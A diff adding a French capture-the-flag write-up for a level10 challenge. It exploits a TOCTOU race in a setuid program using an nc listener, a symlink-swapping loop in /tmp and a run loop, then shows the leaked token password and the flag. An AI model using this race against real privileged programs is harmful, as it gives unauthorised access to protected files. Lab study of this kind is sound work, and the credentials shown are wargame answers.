@@ -1,0 +1,58 @@
+Dans ce niveau, nous avons un exécutable level10 et un fichier token. L'objectif est d'exploiter une vulnérabilité de type TOCTOU (Time Of Check to Time Of Use) pour accéder au contenu du fichier token.
+
+L'exécutable level10 prend deux arguments : un fichier et un hôte. Il vérifie si l'utilisateur a accès au fichier, se connecte à l'hôte sur le port 6969, et envoie le contenu du fichier à l'hôte.
+
+L'exécutable level10 utilise la fonction access pour vérifier les permissions de lecture sur le fichier avant de l'ouvrir. Cela crée une fenêtre de temps où un attaquant peut remplacer le fichier vérifié par un autre fichier (dans ce cas, le fichier token).
+
+Nous allons exploiter cette fenêtre de temps en utilisant un lien symbolique qui alterne rapidement entre l'exécutable level10 et le fichier token. En exécutant l'exécutable level10 en boucle, nous pourrons éventuellement contourner la vérification de permission et obtenir le contenu du fichier token.
+
+On va donc :
+- Écouter sur le port 6969 :
+
+-- nc -lk 6969 --
+
+- Créer une boucle pour alterner le lien symbolique :
+
+-- while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done --
+
+- Exécuter level10 en boucle :
+
+-- while true; do ~/level10 /tmp/exploit localhost; done --
+
+
+Le tout sur 3 terminaux différents.
+
+on peut donc identifié le mdp :
+
+** Sortie :
+��������������Ë$Ð���������U��S������t�f����Ћ���u��[]Ð�S��[��������[�%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 .. Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. Damn. Unable to open fileUnable to read from file: %s
+wrote file!You don't have access to %s
+0����Lx���p��������������zR|
+                            P���F
+                                 J
+��                                tx?�;*2$"@�����B
+  8`|���a�A
+           �A�A�N0JA�A
+                      ��A�������������������
+���o�Ё                                      Є
+�
+ ��H������o���o�(.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+**
+
+On peut donc se connecter avec le mdp woupa2yuojeeaaed06riuj63c
+
+-- su flag10 --
+-- getflag --
+
+** Sortie :
+feulo4b72j7edeahuete3no7c
+**
